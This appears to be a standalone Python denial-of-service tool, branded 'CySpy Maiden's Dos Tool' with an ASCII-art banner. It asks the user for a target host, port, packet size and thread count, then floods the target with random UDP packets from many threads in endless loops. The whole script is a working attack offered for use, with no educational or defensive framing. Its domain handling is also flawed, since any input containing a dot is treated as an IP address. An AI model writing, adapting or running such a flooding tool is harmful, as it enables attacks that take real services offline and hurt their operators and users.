import socket
import random
import threading
import time
import sys
import requests
from urllib.parse import urlparse

banner = r"""
⢠⢤⣤⣤⣤⡤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣯⠿⣯⣷⣯⣇⣤⣄⢠⠀⠀⠀⣤⣤⣤⡏⣿⡿⣿⠛⢛⣿⣿⣿⣧⣤⣤⣤⣤⣤⣤⣀⡀⠀⣠⣤⣀⡀⠀⠀⡀⠄⣠⠀⠀⠀⠀⠀⠀⠀
⣿⣿⠉⠀⠈⠉⠉⢹⢿⣿⣿⠀⠀⢸⣿⣿⣿⢳⡿⣿⣷⣶⣶⣿⣿⣉⣹⣿⣿⣻⠿⠿⢿⣿⣽⣻⣿⣿⣿⡇⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣤⠀⡠⣤⡤⣼⣽⣿⣟⣶⣦⣼⣽⣿⣿⡴⣼⡿⡏⠉⢙⣾⣿⣿⣿⣿⣿⣿⣤⣤⣽⣿⢿⣿⣿⡿⣿⣧⣤⣤⣿⣿⡿⡄⠀⠀⠀⠀⠀⠀
⢻⣹⣿⣿⣿⣿⡟⠛⠉⣻⣿⡿⢿⢿⣽⣿⣿⠓⢯⡿⣿⣿⢿⣿⣿⡿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠀⠈⣳⣿⣿⣿⡿⣿⡿⢿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⢿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠈⠉⠀⠈⠀⠸⣿⣿⡿⣁⠀⠀⠀⠀⠀⠀⠣⠿⣿⣿⣿⣿⣷⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢽⡟⠛⢿⣶⠟⢷⣄⠀⣀⣄⣴⡿⠛⣫⣿⠙⢹⣿⡉⢛⡛⢿⣄⠀⢸⢹⠋⣉⠙⠏⡯⣷⡚⠻⣶⢯⠋⣿⠂
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⢰⣦⡠⣶⠀⣿⣾⣏⠛⢋⣴⡆⢸⣿⠀⢸⣿⠀⢘⣿⣦⡹⣷⣼⣿⠀⡛⠉⠉⡗⣿⡇⣵⣌⠙⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⢸⣯⠛⣿⠀⣿⡞⢋⣴⣌⠙⠇⢸⣿⠀⠈⣿⡀⠸⠿⠿⠵⢌⣿⣿⡐⠽⠿⡛⡇⣿⡇⢹⣿⣿⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠽⠮⠟⠀⣿⣄⣿⠙⠮⠿⠙⠷⠶⠾⠿⠴⠦⠿⠴⠶⠶⠶⠶⠿⠋⠘⠫⠶⠤⠥⠇⠻⠵⠧⠇⣟⣄⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢽⠀

CySpy Maiden's Dos Tool
"""

print(banner)

# === User Input Section ===
print("=== Custom UDP DoS Tool ===")
target_input = input("Enter Target IP or Website URL: ").strip()

# Remove 'http://' or 'https://' from URL
if target_input.startswith("https://"):
    target_input = target_input[8:]
elif target_input.startswith("http://"):
    target_input = target_input[7:]

# Resolve domain using requests (better URL handling)
def resolve_domain(url):
    try:
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)
        return ip
    except Exception as e:
        print(f"❌ Could not resolve target: {e}")
        return None

# Try to resolve domain to IP
if "." in target_input:
    # Looks like an IP address
    target_ip = target_input
else:
    target_ip = resolve_domain(target_input)

if not target_ip:
    print("❌ DNS resolution failed. Please enter the IP address manually.")
    target_ip = input("Enter IP address: ").strip()

print(f"Resolved IP: {target_ip}")

try:
    target_port = int(input("Enter Target Port (e.g., 80): "))
    packet_size = int(input("Enter Packet Size (e.g., 1024): "))
    thread_count = int(input("Enter Number of Threads (e.g., 100): "))
except ValueError:
    print("❌ Invalid input. Use numbers only.")
    sys.exit()

# === DoS Logic ===
def udp_flood(target_ip, target_port, packet_size, thread_count):
    def attack():
        data = random._urandom(packet_size)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                sock.sendto(data, (target_ip, target_port))
                print(f"Sent packet to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error: {e}")
                break

    for _ in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        thread.start()

    print(f"\n🔥 Started attack on {target_ip}:{target_port} with {thread_count} threads.\n")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Attack stopped by user.")
        sys.exit()

# Start the attack
udp_flood(target_ip, target_port, packet_size, thread_count)
